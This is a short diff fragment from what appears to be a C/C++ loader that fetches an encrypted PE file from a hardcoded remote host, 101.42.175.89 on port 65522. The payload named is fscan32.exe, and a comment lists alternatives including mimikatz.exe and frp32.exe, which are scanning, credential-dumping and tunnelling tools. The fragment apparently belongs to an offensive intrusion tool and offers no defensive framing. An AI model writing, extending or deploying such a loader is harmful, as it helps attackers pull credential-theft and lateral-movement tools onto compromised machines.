@@ -911,7 +911,7 @@ int main(int argc, char** argv) {
     // 获取一个加密的PE文件
     wchar_t* whost= L"101.42.175.89";
     DWORD port= 65522;
-    wchar_t* wpe = L"fscan32.exe";   //mimikatz.exe   fscan32.exe  main.exe fscan32.exe
+    wchar_t* wpe = L"fscan32.exe";   //mimikatz.exe   fscan32.exe  main.exe  frp32.exe
     //char* host1 = argv[1];
     //DWORD port1 = atoi(argv[2]);
     //char* pe1 = argv[3];
